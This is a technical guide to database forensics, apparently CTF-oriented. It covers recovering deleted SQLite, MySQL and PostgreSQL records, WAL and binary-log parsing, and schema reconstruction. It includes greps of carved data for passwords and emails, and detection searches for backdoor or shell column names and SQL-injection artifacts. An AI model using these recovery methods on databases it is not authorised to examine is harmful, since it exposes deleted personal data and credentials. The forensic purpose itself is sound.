## Deleted Record Recovery

Techniques for recovering deleted database records across different systems.

### SQLite Deleted Record Recovery

**Freelist analysis:**

```python
import sqlite3
import struct

def recover_from_freelist(db_path):
    # Read database file directly
    with open(db_path, 'rb') as f:
        # Get page size from header
        f.seek(16)
        page_size = struct.unpack('>H', f.read(2))[0]
        
        # Get first freelist page from header
        f.seek(32)
        first_freelist = struct.unpack('>I', f.read(4))[0]
        
        if first_freelist == 0:
            print("No freelist pages")
            return
        
        # Read freelist trunk page
        f.seek((first_freelist - 1) * page_size)
        trunk_data = f.read(page_size)
        
        # Parse trunk page header
        next_trunk = struct.unpack('>I', trunk_data[0:4])[0]
        num_leafs = struct.unpack('>I', trunk_data[4:8])[0]
        
        print(f"Freelist trunk page: {first_freelist}")
        print(f"Number of leaf pages: {num_leafs}")
        
        # Extract leaf page numbers
        for i in range(num_leafs):
            leaf_page = struct.unpack('>I', trunk_data[8 + i*4:12 + i*4])[0]
            print(f"Leaf page: {leaf_page}")
            
            # Read leaf page
            f.seek((leaf_page - 1) * page_size)
            leaf_data = f.read(page_size)
            
            # Extract strings (potential deleted data)
            strings_found = []
            current_string = b''
            for byte in leaf_data:
                if 32 <= byte <= 126:  # Printable ASCII
                    current_string += bytes([byte])
                else:
                    if len(current_string) >= 4:
                        strings_found.append(current_string.decode('ascii', errors='ignore'))
                    current_string = b''
            
            if strings_found:
                print(f"  Found strings in page {leaf_page}:")
                for s in strings_found[:10]:  # First 10 strings
                    print(f"    {s}")

recover_from_freelist('database.db')
```

**Unallocated space carving:**

```bash
# Extract unallocated space
python3 << 'EOF'
import sqlite3

def extract_unallocated(db_path, output_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Get page size
    cursor.execute("PRAGMA page_size;")
    page_size = cursor.fetchone()[0]
    
    # Get total pages
    cursor.execute("PRAGMA page_count;")
    total_pages = cursor.fetchone()[0]
    
    # Get used pages (approximate)
    cursor.execute("SELECT * FROM sqlite_master;")
    
    conn.close()
    
    # Read database file
    with open(db_path, 'rb') as f:
        data = f.read()
    
    # Extract potential deleted records
    with open(output_path, 'wb') as out:
        # Simple approach: extract all data
        out.write(data)
    
    print(f"Extracted {len(data)} bytes")
    print(f"Page size: {page_size}, Total pages: {total_pages}")

extract_unallocated('database.db', 'unallocated.bin')
EOF

# Search for patterns
strings unallocated.bin | grep -i "email\|password\|user"
```

### MySQL/InnoDB Deleted Record Recovery

**Undo log examination:**

```bash
# InnoDB stores transaction history in undo logs
# Located in ibdata1 or separate undo tablespaces

# Using innodb_ruby
innodb_space -f ibdata1 space-undo-logs

# List undo log records
innodb_space -f ibdata1 space-lists

# [Inference] Undo logs purged periodically by background thread
# Recovery window depends on transaction volume and purge settings
```

**TRX_ID analysis:**

```bash
# Each row has hidden columns:
# - DB_TRX_ID: Transaction ID that created/modified row
# - DB_ROLL_PTR: Pointer to undo log record

# Use innodb_space to examine
innodb_space -f table.ibd -I PRIMARY space-index-pages-summary

# Find rows with high TRX_ID (recent modifications/deletions)
```

### PostgreSQL Deleted Record Recovery

**Dead tuple access:**

```sql
-- Check for dead tuples
SELECT schemaname, tablename, n_live_tup, n_dead_tup
FROM pg_stat_user_tables
WHERE n_dead_tup > 0
ORDER BY n_dead_tup DESC;

-- Disable autovacuum to preserve dead tuples
ALTER TABLE sensitive_table SET (autovacuum_enabled = false);

-- [Inference] Dead tuples remain until manual or auto VACUUM
-- Use pg_dirtyread extension for access (if available)
```

**WAL recovery:**

```bash
# Extract DELETE operations from WAL
pg_waldump /path/to/pg_wal/* | grep "DELETE" > deletes.txt

# Parse delete records
awk '/DELETE/ {
    # Extract relation OID and block number
    print $0
}' deletes.txt

# Cross-reference with system catalogs to identify tables
psql -c "SELECT oid, relname FROM pg_class WHERE oid = <relation_oid>;"
```

## Write-Ahead Log (WAL) Analysis

In-depth analysis of WAL mechanisms across database systems.

### SQLite WAL Format

**WAL frame extraction:**

```python
import struct

def parse_sqlite_wal(wal_path):
    with open(wal_path, 'rb') as f:
        # Read WAL header
        magic = struct.unpack('>I', f.read(4))[0]
        file_format = struct.unpack('>I', f.read(4))[0]
        page_size = struct.unpack('>I', f.read(4))[0]
        checkpoint_seq = struct.unpack('>I', f.read(4))[0]
        salt1 = struct.unpack('>I', f.read(4))[0]
        salt2 = struct.unpack('>I', f.read(4))[0]
        checksum1 = struct.unpack('>I', f.read(4))[0]
        checksum2 = struct.unpack('>I', f.read(4))[0]
        
        print(f"WAL Header:")
        print(f"  Magic: {hex(magic)}")
        print(f"  Page size: {page_size}")
        print(f"  Checkpoint: {checkpoint_seq}")
        print()
        
        frame_num = 0
        while True:
            # Read frame header
            frame_header = f.read(24)
            if len(frame_header) < 24:
                break
            
            page_num = struct.unpack('>I', frame_header[0:4])[0]
            db_size = struct.unpack('>I', frame_header[4:8])[0]
            
            # Read frame data
            frame_data = f.read(page_size)
            if len(frame_data) < page_size:
                break
            
            frame_num += 1
            print(f"Frame {frame_num}: Page {page_num}, DB size {db_size} pages")
            
            # Save frame for analysis
            with open(f"frame_{frame_num}.bin", 'wb') as out:
                out.write(frame_data)
            
            # Extract readable strings
            strings_found = []
            current = b''
            for byte in frame_data:
                if 32 <= byte <= 126:
                    current += bytes([byte])
                else:
                    if len(current) >= 4:
                        strings_found.append(current.decode('ascii', errors='ignore'))
                    current = b''
            
            if strings_found:
                print(f"  Sample strings: {strings_found[:3]}")
            print()

parse_sqlite_wal('database.db-wal')
```

### MySQL Binary Log Deep Dive

**Row-based format parsing:**

```bash
# Decode row events with column values
mysqlbinlog --base64-output=DECODE-ROWS -vv mysql-bin.000001 > decoded_verbose.sql

# Example output for INSERT:
### INSERT INTO `users`
### SET
###   @1=1001 /* INT meta=0 nullable=0 is_null=0 */
###   @2='john.doe@example.com' /* VARSTRING(765) meta=765 nullable=1 is_null=0 */
###   @3='John Doe' /* VARSTRING(765) meta=765 nullable=1 is_null=0 */
###   @4=1609459200 /* TIMESTAMP(0) meta=0 nullable=1 is_null=0 */

# For DELETE operations, this shows exact deleted values
```

**Transaction reconstruction:**

```bash
# Extract complete transactions
mysqlbinlog mysql-bin.000001 | awk '
/BEGIN/ { tx = 1; buffer = "" }
tx { buffer = buffer "\n" $0 }
/COMMIT/ { 
    if (tx) {
        print buffer
        print "---END TRANSACTION---"
    }
    tx = 0
}
'
```

### PostgreSQL WAL Record Details

**LSN (Log Sequence Number) tracking:**

```bash
# LSN format: LogFileNumber/ByteOffset
# Example: 0/12345678

# Find specific LSN in WAL
pg_waldump -s 0/12340000 -e 0/12350000 /path/to/pg_wal/*

# Track changes to specific table
pg_waldump /path/to/pg_wal/* | grep "rel 1663/16384/16385"
# Format: rel <tablespace>/<database>/<relation>
```

**Resource manager decoding:**

```bash
# Heap records (table data)
pg_waldump /path/to/pg_wal/* | grep "rmgr: Heap"

# Common Heap record types:
# - INSERT: New tuple
# - DELETE: Tuple deletion
# - UPDATE: Tuple modification
# - HOT_UPDATE: Heap-Only Tuple update (no index update)
# - LOCK: Tuple lock

# Extract INSERT operations with data
pg_waldump /path/to/pg_wal/* | awk '/rmgr: Heap.*INSERT/ {print; getline; print; getline; print}'
```

## Schema Reconstruction

Recovering database structure from files or fragments.

### SQLite Schema Recovery

**From intact database:**

```sql
-- Extract complete schema
SELECT sql FROM sqlite_master WHERE type='table';

-- Include indexes and triggers
SELECT type, name, tbl_name, sql
FROM sqlite_master
ORDER BY type, name;

-- Export schema
.output schema.sql
.schema
.output stdout
```

**From corrupted database:**

```bash
# Use strings to extract CREATE statements
strings database.db | grep -i "CREATE TABLE" > partial_schema.txt

# Parse sqlite_master remnants
strings database.db | grep -A 5 "sqlite_master"

# Reconstruct from data patterns
python3 << 'EOF'
import re

def infer_schema(db_path):
    with open(db_path, 'rb') as f:
        data = f.read().decode('latin-1', errors='ignore')
    
    # Find CREATE TABLE statements in strings
    tables = re.findall(r'CREATE TABLE [\w\s(),"]+;', data, re.IGNORECASE)
    
    print("Recovered schema fragments:")
    for table in tables:
        print(table)
        print()

infer_schema('corrupted.db')
EOF
```

### MySQL Schema Recovery

**From .frm files (MySQL 5.7 and earlier):**

```bash
# Using mysqlfrm (MySQL Utilities)
mysqlfrm --diagnostic table.frm

# Output provides CREATE TABLE statement
# Example output:
# CREATE TABLE `users` (
#   `id` int(11) NOT NULL AUTO_INCREMENT,
#   `username` varchar(50) DEFAULT NULL,
#   `email` varchar(100) DEFAULT NULL,
#   PRIMARY KEY (`id`)
# ) ENGINE=InnoDB DEFAULT CHARSET=utf8;

# Batch process all .frm files
for frm in *.frm; do
    echo "Processing $frm"
    mysqlfrm --diagnostic "$frm" >> recovered_schema.sql
done
```

**From InnoDB data dictionary (MySQL 8.0+):**

```bash
# MySQL 8.0+ stores metadata in InnoDB tables
# Data dictionary in mysql.ibd tablespace

# If MySQL is running:
mysql -u root -p << 'EOF'
SELECT 
    CONCAT('CREATE TABLE `', t.name, '` (') as create_start,
    GROUP_CONCAT(
        CONCAT('`', c.name, '` ', c.type, 
               IF(c.is_nullable = 1, ' NULL', ' NOT NULL'))
        SEPARATOR ', '
    ) as columns,
    ');' as create_end
FROM information_schema.innodb_tables t
JOIN information_schema.innodb_columns c ON t.table_id = c.table_id
WHERE t.name LIKE 'database_name/%'
GROUP BY t.name;
EOF
```

**Reconstructing from ibdata1:**

```bash
# Extract data dictionary from system tablespace
innodb_space -f ibdata1 space-page-type-summary

# List system tables
innodb_space -f ibdata1 space-tables-summary

# [Inference] Requires deep InnoDB internals knowledge
# Alternative: use MySQL installation with copied ibdata1
```

**From binary logs:**

```bash
# Extract DDL statements from binary logs
mysqlbinlog mysql-bin.* | grep -i "CREATE TABLE\|ALTER TABLE\|DROP TABLE" > ddl_history.sql

# Shows schema evolution over time
# Reconstruct current schema from latest CREATE/ALTER statements
```

### PostgreSQL Schema Recovery

**From running instance:**

```bash
# Dump schema only (no data)
pg_dump -U postgres --schema-only database_name > schema.sql

# Include all objects
pg_dump -U postgres --schema-only --create --clean database_name > complete_schema.sql
```

**From data files (offline):**

```bash
# Start temporary PostgreSQL instance with copied data
pg_ctl -D ./recovered_pgdata start

# Extract schema
psql -U postgres -d recovered_db -c "\d+" > table_definitions.txt

# Or use pg_dump
pg_dump -U postgres --schema-only recovered_db > recovered_schema.sql
```

**Reconstructing from pg_class:**

```sql
-- Connect to recovered database
-- pg_class contains table metadata

SELECT 
    c.relname as table_name,
    c.relkind as object_type,  -- r=table, i=index, S=sequence, v=view
    n.nspname as schema_name,
    c.relnatts as num_columns,
    c.relpages as num_pages,
    c.reltuples as estimated_rows
FROM pg_class c
JOIN pg_namespace n ON c.relnamespace = n.oid
WHERE c.relkind IN ('r', 'v')  -- Tables and views
  AND n.nspname NOT IN ('pg_catalog', 'information_schema')
ORDER BY n.nspname, c.relname;

-- Get column information from pg_attribute
SELECT 
    a.attname as column_name,
    t.typname as data_type,
    a.attlen as length,
    a.attnum as position,
    a.attnotnull as not_null
FROM pg_attribute a
JOIN pg_type t ON a.atttypid = t.oid
WHERE a.attrelid = '<table_oid>'::regclass
  AND a.attnum > 0  -- Exclude system columns
  AND NOT a.attisdropped
ORDER BY a.attnum;
```

**From WAL files:**

```bash
# Extract DDL operations from WAL
pg_waldump /path/to/pg_wal/* | grep -i "CREATE\|ALTER\|DROP" > ddl_from_wal.txt

# Shows schema changes over time
# Helps reconstruct schema evolution
```

### Cross-Database Schema Analysis

**Comparing schemas:**

```bash
# SQLite to SQL
sqlite3 database.db .schema > sqlite_schema.sql

# MySQL schema
mysqldump -u root -p --no-data database_name > mysql_schema.sql

# PostgreSQL schema
pg_dump -U postgres --schema-only database_name > postgres_schema.sql

# Compare schemas
diff sqlite_schema.sql mysql_schema.sql
```

**Schema normalization for comparison:**

```python
import re

def normalize_schema(schema_sql, db_type):
    """Normalize schema for cross-database comparison"""
    
    # Convert to uppercase for consistency
    normalized = schema_sql.upper()
    
    # Standardize data types
    type_mappings = {
        'INT': 'INTEGER',
        'INT4': 'INTEGER',
        'INT8': 'BIGINT',
        'VARCHAR': 'TEXT',
        'CHARACTER VARYING': 'TEXT',
        'TIMESTAMP': 'DATETIME',
        'BOOLEAN': 'INTEGER',
        'BOOL': 'INTEGER'
    }
    
    for old_type, new_type in type_mappings.items():
        normalized = re.sub(r'\b' + old_type + r'\b', new_type, normalized)
    
    # Remove database-specific syntax
    normalized = re.sub(r'AUTO_INCREMENT', '', normalized)
    normalized = re.sub(r'AUTOINCREMENT', '', normalized)
    normalized = re.sub(r'ENGINE=\w+', '', normalized)
    normalized = re.sub(r'DEFAULT CHARSET=\w+', '', normalized)
    
    # Remove extra whitespace
    normalized = re.sub(r'\s+', ' ', normalized)
    
    return normalized

# Usage
with open('mysql_schema.sql', 'r') as f:
    mysql_schema = f.read()

with open('postgres_schema.sql', 'r') as f:
    postgres_schema = f.read()

norm_mysql = normalize_schema(mysql_schema, 'mysql')
norm_postgres = normalize_schema(postgres_schema, 'postgres')

# Compare normalized schemas
```

### Inferring Schema from Data

**Automated type detection:**

```python
def infer_schema_from_data(data_rows):
    """Infer table schema from data samples"""
    
    if not data_rows:
        return None
    
    # Analyze first row for column count
    num_columns = len(data_rows[0])
    
    # Initialize column info
    columns = []
    for col_idx in range(num_columns):
        col_info = {
            'name': f'column_{col_idx}',
            'type': None,
            'nullable': False,
            'max_length': 0,
            'samples': []
        }
        columns.append(col_info)
    
    # Analyze each row
    for row in data_rows:
        for col_idx, value in enumerate(row):
            if value is None or value == '':
                columns[col_idx]['nullable'] = True
                continue
            
            # Track max length
            if isinstance(value, str):
                columns[col_idx]['max_length'] = max(
                    columns[col_idx]['max_length'], 
                    len(value)
                )
            
            # Store sample
            if len(columns[col_idx]['samples']) < 5:
                columns[col_idx]['samples'].append(value)
            
            # Infer type
            current_type = columns[col_idx]['type']
            detected_type = detect_type(value)
            
            # Promote type if needed (INT -> FLOAT -> TEXT)
            if current_type is None:
                columns[col_idx]['type'] = detected_type
            elif current_type == 'INTEGER' and detected_type == 'FLOAT':
                columns[col_idx]['type'] = 'FLOAT'
            elif detected_type == 'TEXT':
                columns[col_idx]['type'] = 'TEXT'
    
    # Generate CREATE TABLE statement
    create_stmt = "CREATE TABLE recovered_table (\n"
    col_defs = []
    
    for col in columns:
        col_type = col['type'] or 'TEXT'
        
        if col_type == 'TEXT' and col['max_length'] > 0:
            col_type = f"VARCHAR({col['max_length']})"
        
        nullable = '' if col['nullable'] else ' NOT NULL'
        
        col_defs.append(f"  {col['name']} {col_type}{nullable}")
    
    create_stmt += ',\n'.join(col_defs)
    create_stmt += "\n);"
    
    return create_stmt

def detect_type(value):
    """Detect data type of value"""
    if isinstance(value, int) or (isinstance(value, str) and value.isdigit()):
        return 'INTEGER'
    
    try:
        float(value)
        return 'FLOAT'
    except (ValueError, TypeError):
        pass
    
    # Check for date/time patterns
    import re
    if re.match(r'\d{4}-\d{2}-\d{2}', str(value)):
        return 'DATE'
    if re.match(r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}', str(value)):
        return 'TIMESTAMP'
    
    return 'TEXT'

# Example usage
sample_data = [
    [1, 'john@example.com', 'John Doe', '2024-01-15'],
    [2, 'jane@example.com', 'Jane Smith', '2024-01-16'],
    [3, 'bob@example.com', None, '2024-01-17']
]

schema = infer_schema_from_data(sample_data)
print(schema)
```

### Schema Validation and Integrity

**Checking referential integrity:**

```sql
-- SQLite: Check foreign key constraints
PRAGMA foreign_key_check;

-- MySQL: Check foreign keys
SELECT 
    TABLE_NAME,
    COLUMN_NAME,
    CONSTRAINT_NAME,
    REFERENCED_TABLE_NAME,
    REFERENCED_COLUMN_NAME
FROM information_schema.KEY_COLUMN_USAGE
WHERE CONSTRAINT_SCHEMA = 'database_name'
  AND REFERENCED_TABLE_NAME IS NOT NULL;

-- PostgreSQL: Check foreign keys
SELECT
    tc.table_name,
    kcu.column_name,
    ccu.table_name AS foreign_table_name,
    ccu.column_name AS foreign_column_name
FROM information_schema.table_constraints AS tc
JOIN information_schema.key_column_usage AS kcu
    ON tc.constraint_name = kcu.constraint_name
JOIN information_schema.constraint_column_usage AS ccu
    ON ccu.constraint_name = tc.constraint_name
WHERE tc.constraint_type = 'FOREIGN KEY';
```

**Identifying orphaned records:**

```sql
-- Find records with missing foreign key references
SELECT parent.*
FROM parent_table parent
LEFT JOIN child_table child ON parent.id = child.parent_id
WHERE child.parent_id IS NULL;

-- Find child records referencing non-existent parents
SELECT child.*
FROM child_table child
LEFT JOIN parent_table parent ON child.parent_id = parent.id
WHERE parent.id IS NULL AND child.parent_id IS NOT NULL;
```

### Forensic Schema Analysis

**Detecting schema anomalies:**

```sql
-- Tables without primary keys (suspicious)
-- SQLite
SELECT name FROM sqlite_master 
WHERE type='table' 
  AND name NOT LIKE 'sqlite_%'
  AND sql NOT LIKE '%PRIMARY KEY%';

-- MySQL
SELECT table_name
FROM information_schema.tables t
LEFT JOIN information_schema.table_constraints tc
    ON t.table_name = tc.table_name
    AND tc.constraint_type = 'PRIMARY KEY'
WHERE t.table_schema = 'database_name'
  AND tc.constraint_name IS NULL;

-- PostgreSQL
SELECT tablename
FROM pg_tables
WHERE schemaname = 'public'
  AND tablename NOT IN (
      SELECT tablename
      FROM pg_indexes
      WHERE indexdef LIKE '%PRIMARY KEY%'
  );
```

**Unusual column names:**

```bash
# Search for suspicious column names
# Common in malware/backdoors

# SQLite
sqlite3 database.db "SELECT name, sql FROM sqlite_master WHERE type='table';" | \
grep -i "backdoor\|shell\|cmd\|exec\|eval"

# MySQL
mysql -u root -p -e "
SELECT TABLE_NAME, COLUMN_NAME
FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = 'database_name'
  AND (COLUMN_NAME LIKE '%backdoor%'
    OR COLUMN_NAME LIKE '%shell%'
    OR COLUMN_NAME LIKE '%cmd%');"
```

**Timestamp analysis:**

```sql
-- Find tables modified recently (forensic indicator)
-- MySQL
SELECT 
    TABLE_NAME,
    CREATE_TIME,
    UPDATE_TIME,
    CHECK_TIME
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = 'database_name'
ORDER BY UPDATE_TIME DESC;

-- PostgreSQL: Check system catalog modification times
SELECT 
    schemaname,
    tablename,
    pg_stat_get_last_analyze_time(c.oid) as last_analyze,
    pg_stat_get_last_autoanalyze_time(c.oid) as last_autoanalyze
FROM pg_tables t
JOIN pg_class c ON t.tablename = c.relname
WHERE schemaname = 'public'
ORDER BY last_analyze DESC NULLS LAST;
```

### Advanced Recovery Techniques

**Carving database structures from memory:**

```bash
# Extract from memory dump
strings memory.dump | grep -i "CREATE TABLE" > carved_schemas.txt

# Look for database file signatures in memory
xxd memory.dump | grep "5351 4c69 7465 2066 6f72 6d61 7420 33"  # SQLite

# Extract MySQL query cache from memory
strings memory.dump | grep -A 5 "SELECT.*FROM"
```

**Reconstructing from backup fragments:**

```bash
# SQLite: Combine partial .db files
cat fragment1.db fragment2.db > combined.db
sqlite3 combined.db .schema  # Attempt recovery

# MySQL: Reconstruct from partial .ibd files
# [Inference] Requires expertise in InnoDB page structure
# Pages may be out of order but contain table data

# Use innodb_space to analyze fragments
for fragment in fragment*.ibd; do
    echo "Analyzing $fragment"
    innodb_space -f "$fragment" space-page-type-summary
done
```

**Hex-level schema extraction:**

```python
def extract_table_names_from_hex(file_path):
    """Extract potential table names from binary database file"""
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Convert to string with latin-1 encoding
    text = data.decode('latin-1', errors='ignore')
    
    # Look for CREATE TABLE patterns
    import re
    creates = re.findall(r'CREATE TABLE\s+[`"]?(\w+)[`"]?', text, re.IGNORECASE)
    
    # Look for table names in data patterns
    # Common pattern: repeated strings that look like table names
    potential_tables = set()
    words = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]{2,30}\b', text)
    
    # Count occurrences
    from collections import Counter
    word_counts = Counter(words)
    
    # Tables often appear multiple times
    for word, count in word_counts.most_common(50):
        if count > 5 and not word.isupper():  # Heuristic
            potential_tables.add(word)
    
    return {
        'explicit_creates': creates,
        'potential_tables': list(potential_tables)
    }

# Usage
results = extract_table_names_from_hex('corrupted.db')
print("Explicit CREATE statements found:", results['explicit_creates'])
print("\nPotential table names:", results['potential_tables'])
```

### CTF-Specific Techniques

**Common database forensics CTF patterns:**

1. **Hidden tables/columns:**

```sql
-- SQLite: Check for tables with non-standard names
SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%hidden%';

-- Look for base64/hex encoded table names
SELECT name, hex(name) FROM sqlite_master WHERE type='table';
```

2. **Steganography in BLOBs:**

```python
import sqlite3

def extract_blobs(db_path):
    """Extract BLOB data for steganography analysis"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Find tables with BLOB columns
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    
    for (table_name,) in tables:
        cursor.execute(f"PRAGMA table_info({table_name});")
        columns = cursor.fetchall()
        
        for col in columns:
            col_name = col[1]
            col_type = col[2]
            
            if 'BLOB' in col_type.upper():
                print(f"Found BLOB column: {table_name}.{col_name}")
                
                # Extract BLOBs
                cursor.execute(f"SELECT {col_name} FROM {table_name};")
                blobs = cursor.fetchall()
                
                for idx, (blob_data,) in enumerate(blobs):
                    if blob_data:
                        with open(f"{table_name}_{col_name}_{idx}.bin", 'wb') as f:
                            f.write(blob_data)
                        print(f"  Extracted blob {idx}: {len(blob_data)} bytes")
    
    conn.close()

extract_blobs('challenge.db')
```

3. **SQL injection artifacts:**

```bash
# Check for malicious payloads in data
sqlite3 database.db "SELECT * FROM users WHERE username LIKE '%UNION%';"

# Look for encoded payloads
sqlite3 database.db "SELECT * FROM logs;" | grep -i "char(.*char(.*char("
```

4. **Time-based analysis:**

```sql
-- Find records created/modified in suspicious timeframes
SELECT * FROM table_name 
WHERE datetime(created_at) BETWEEN '2024-01-01' AND '2024-01-02';

-- Cluster analysis: multiple records at exact same timestamp
SELECT created_at, COUNT(*) as count
FROM table_name
GROUP BY created_at
HAVING count > 1
ORDER BY count DESC;
```

5. **Data exfiltration traces:**

```sql
-- Large text fields (potential data dumps)
SELECT id, LENGTH(description) as length
FROM articles
WHERE LENGTH(description) > 10000
ORDER BY length DESC;

-- Unusual character patterns (base64, hex)
SELECT * FROM data_table
WHERE content REGEXP '^[A-Za-z0-9+/]+={0,2}$'  -- Base64 pattern
   OR content REGEXP '^[0-9a-fA-F]+$';          -- Hex pattern
```

**Related topics:** File system forensics (recovering deleted database files), memory forensics (extracting live database connections and queries), network forensics (capturing database traffic), application forensics (web application database interactions), encryption analysis (encrypted database columns, TDE)